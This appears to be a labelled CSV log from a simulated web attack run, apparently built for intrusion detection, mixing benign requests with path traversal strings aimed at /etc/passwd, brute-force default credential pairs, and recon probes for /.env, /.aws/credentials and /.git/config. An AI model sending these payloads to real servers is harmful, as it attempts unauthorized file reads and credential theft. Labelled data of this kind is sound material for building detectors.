timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-06-22T15:14:27.756008,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,N/A,False
2026-06-22T15:14:30.221349,path_traversal,....//....//....//etc/passwd,1,N/A,False
2026-06-22T15:14:32.601717,path_traversal,/var/www/../../etc/passwd,1,N/A,False
2026-06-22T15:14:34.951755,benign,normal_request,0,N/A,False
2026-06-22T15:14:37.254993,benign,normal_request,0,200,False
2026-06-22T15:14:40.025944,benign,normal_request,0,200,False
2026-06-22T15:14:42.439395,benign,normal_request,0,N/A,False
2026-06-22T15:14:45.175714,benign,normal_request,0,N/A,False
2026-06-22T15:14:47.690815,benign,normal_request,0,N/A,False
2026-06-22T15:14:50.553233,benign,normal_request,0,201,False
2026-06-22T15:14:53.359779,benign,normal_request,0,201,False
2026-06-22T15:14:56.737197,brute_force,test:Admin@123,1,N/A,False
2026-06-22T15:14:59.592620,brute_force,test:123456,1,N/A,False
2026-06-22T15:15:02.650435,brute_force,root:letmein,1,N/A,False
2026-06-22T15:15:05.472030,brute_force,root:Admin@123,1,N/A,False
2026-06-22T15:15:10.371085,brute_force,user:password,1,N/A,False
2026-06-22T15:15:12.618109,brute_force,root:password,1,N/A,False
2026-06-22T15:15:14.884951,brute_force,administrator:123456,1,N/A,False
2026-06-22T15:15:17.055959,brute_force,root:Admin@123,1,N/A,False
2026-06-22T15:15:19.227256,brute_force,root:password,1,N/A,False
2026-06-22T15:15:21.398075,brute_force,user:123456,1,N/A,False
2026-06-22T15:15:23.599699,brute_force,user:admin123,1,N/A,False
2026-06-22T15:15:25.779195,brute_force,user:Admin@123,1,N/A,False
2026-06-22T15:15:27.996376,brute_force,admin:password,1,N/A,False
2026-06-22T15:15:30.259513,brute_force,root:123456,1,N/A,False
2026-06-22T15:15:32.506335,brute_force,user:password,1,N/A,False
2026-06-22T15:15:34.627682,brute_force,root:123456,1,N/A,False
2026-06-22T15:15:36.893849,brute_force,user:Admin@123,1,N/A,False
2026-06-22T15:15:39.087164,brute_force,administrator:admin123,1,N/A,False
2026-06-22T15:15:41.361498,brute_force,root:Admin@123,1,N/A,False
2026-06-22T15:15:43.541372,brute_force,test:letmein,1,N/A,False
2026-06-22T15:15:45.829719,brute_force,root:letmein,1,N/A,False
2026-06-22T15:15:47.927361,brute_force,test:123456,1,N/A,False
2026-06-22T15:15:50.088525,brute_force,user:password,1,N/A,False
2026-06-22T15:15:52.278038,brute_force,admin:admin123,1,N/A,False
2026-06-22T15:15:54.504942,brute_force,user:Admin@123,1,N/A,False
2026-06-22T15:15:56.780365,benign,normal_request,0,N/A,False
2026-06-22T15:15:59.614115,benign,normal_request,0,200,False
2026-06-22T15:16:02.011289,benign,normal_request,0,200,False
2026-06-22T15:16:04.426601,benign,normal_request,0,200,False
2026-06-22T15:16:07.189118,benign,normal_request,0,200,False
2026-06-22T15:16:09.683820,benign,normal_request,0,N/A,False
2026-06-22T15:16:12.185940,benign,normal_request,0,N/A,False
2026-06-22T15:16:14.548416,benign,normal_request,0,200,False
2026-06-22T15:16:17.180505,benign,normal_request,0,N/A,False
2026-06-22T15:16:19.698884,benign,normal_request,0,201,False
2026-06-22T15:16:27.105618,recon,/db/virex.db,1,N/A,False
2026-06-22T15:16:29.363902,recon,/server-status,1,N/A,False
2026-06-22T15:16:35.283528,recon,/.aws/credentials,1,N/A,False
2026-06-22T15:16:42.505525,recon,/db/virex.db,1,N/A,False
2026-06-22T15:16:49.666779,recon,/db/virex.db,1,N/A,False
2026-06-22T15:16:56.892706,recon,/db/virex.db,1,N/A,False
2026-06-22T15:16:59.122820,recon,/.git/HEAD,1,N/A,False
2026-06-22T15:17:05.583232,recon,/.env,1,N/A,False
2026-06-22T15:17:09.002558,recon,/db/virex.db,1,N/A,False
2026-06-22T15:17:12.495915,recon,/backup.sql,1,N/A,False
2026-06-22T15:17:14.674297,recon,/server-status,1,N/A,False
2026-06-22T15:17:16.900366,recon,/phpmyadmin,1,N/A,False
2026-06-22T15:17:21.310388,recon,/.env,1,N/A,False
2026-06-22T15:17:25.591813,recon,/.git/config,1,N/A,False
2026-06-22T15:17:29.083897,recon,/backup.sql,1,N/A,False
2026-06-22T15:17:31.268034,benign,normal_request,0,201,False
2026-06-22T15:17:34.093056,benign,normal_request,0,201,False
2026-06-22T15:17:36.964187,benign,normal_request,0,200,False
2026-06-22T15:17:39.368009,benign,normal_request,0,N/A,False
2026-06-22T15:17:41.693715,benign,normal_request,0,N/A,False
2026-06-22T15:17:44.030435,benign,normal_request,0,201,False
2026-06-22T15:17:46.385962,benign,normal_request,0,N/A,False
2026-06-22T15:17:48.689957,benign,normal_request,0,200,False
2026-06-22T15:17:51.224126,benign,normal_request,0,N/A,False
2026-06-22T15:17:53.779079,benign,normal_request,0,N/A,False
